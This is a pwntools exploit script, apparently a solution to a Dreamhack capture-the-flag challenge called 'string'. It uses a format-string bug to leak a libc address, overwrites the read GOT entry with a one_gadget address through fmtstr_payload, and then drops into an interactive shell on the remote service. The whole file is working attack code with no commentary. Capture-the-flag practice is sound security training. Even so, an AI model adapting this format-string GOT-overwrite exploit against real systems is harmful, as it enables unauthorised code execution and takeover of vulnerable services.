
from pwn import *

context.clear(arch = 'i386')
# r = process('./string')
r = remote('host1.dreamhack.games', 18135)
lib = ELF('./libc.so.6', checksec=False)
elf = ELF('./string', checksec=False)

main = lib.sym['__libc_start_main']
read_elf = elf.got['read']
one_gadget = 0x5f066

r.recvuntil('> ')
r.sendline('1')
r.recvuntil('Input: ')
r.sendline('AAAA %71$p')
r.recvuntil('> ')
r.sendline('2')

leak = int(r.recvline().split()[2],16) - 247 - main

r.recvuntil('> ')
r.sendline('1')
r.recvuntil('Input: ')
r.sendline(fmtstr_payload(5,{read_elf:leak+one_gadget}))
r.recvuntil('> ')
r.sendline('2')
r.recvuntil('> ')
r.sendline('1')

r.interactive()
